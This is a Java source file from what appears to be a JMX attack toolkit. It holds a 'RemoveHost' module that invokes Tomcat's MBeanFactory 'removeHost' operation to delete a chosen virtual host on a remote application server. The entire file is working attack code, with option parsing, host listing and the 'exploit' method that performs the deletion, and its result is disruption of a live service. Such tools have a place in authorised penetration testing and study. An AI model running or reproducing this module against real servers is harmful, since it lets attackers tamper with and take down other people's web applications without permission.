package jmxattacks;


import java.io.IOException;
import java.util.ArrayList;
import java.util.Iterator;
import javax.management.ObjectName;
import jmxinfos.Hostinfos;
import jmxmenus.MainMenu;
import jmxutils.EasyBasicParser;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.OptionBuilder;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;
import org.apache.commons.cli.Parser;

public class RemoveHost extends Attack{

	String description = "This attack will remove an hostname on the application server";
	String name = "RemoveHost";
	String banner = "Please enter options for this module or back to return to the main menu";
	String example = "--name host";
	private static String mbean = "Catalina:type=MBeanFactory";
	private static String operation ="removeHost";
	private ObjectName object ;
	private String host;
	private Object retour;
	
	public RemoveHost()
	{
		this.setAttack_description(description);
		this.setAttack_name(name);	
	}
	public void prepareExploit(String arg)
	{
		
		this.object = createObject(this.mbean);		
		
		if (this.object != null)
		{ 
			Parser parser = new EasyBasicParser();
			CommandLine line = null;
		
			try {
				line = parser.parse( this.setArgs(), StringtoArrayList(arg));
			} catch (ParseException e) {
				System.err.println( "Parsing failed.  Reason: " + e.getMessage() );
				System.exit(-1);
			}
			
			if (line != null)
			{
			    this.host = line.getOptionValue("name");
			    this.exploit();
			}					
		}
		else
		{
			System.out.println("Error the object cannot be instanciated. Does the operation " + this.operation + " is available on " + this.mbean + " ?\nReturn to the main menu \n");
		}
	}
	private Options setArgs()
	{
		Options options = new Options();
		options.addOption("h", "help", true, "prints the help content");
		   options.addOption(OptionBuilder
			       .withArgName("name")
			       .withLongOpt("name")
			       .hasArg()
			       .isRequired()
			       .withDescription("hostname to delete")
			       .create());
		   
		   return options;
	}
	
	public void displayHost ()
	{
		ArrayList<String> list;
		try {
			Hostinfos hostinfo;
			hostinfo = new Hostinfos();
			list = hostinfo.getHosts_list();
			Iterator<String> it = list.iterator();
			System.out.print("\nHosts available : ");
			while(it.hasNext()) {
			     Object element = it.next();
			     System.out.print(element + ", ");
			  }
			System.out.print("\n");
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	private void exploit()
	{
		// Prepare removeHost
		
		Object[] a;
		String[] b;
		a = new Object[1];
        a[0] = "Catalina:type=Host,host="+this.host;
        b = new String[1];
        b[0] = "java.lang.String";
        System.out.println("#### " +this.operation+ " operation will be invoke ####");
     // Invoke removeHost
		this.retour = invoke(this.object, this.operation,a, b);
		if (this.retour != null) System.out.println(this.retour.toString());
		try {
			Thread.sleep(2000);
		} catch (InterruptedException e) {
			System.out.println(e.getMessage());	
		}
	}
	
	public void prepareExploit() {
		System.out.println(this.name+" exploit selected");
		this.object = createObject(this.mbean);		
		
		if (this.object != null)
		{ 
			displayHost();
			// Display Menu to retrieve options
			CommandLine line = attackMenu(this.setArgs(),this.banner,this.example);
			if (line != null)
			{
			    this.host = line.getOptionValue("name");
			    this.exploit();
			}					
		}
		else
		{
			System.out.println("Error the object cannot be instanciated. Does the operation " + this.operation + " is available on " + this.mbean + " ?\nReturn to the main menu \n");
		}
			MainMenu menu = new MainMenu();
			
	}
	

}
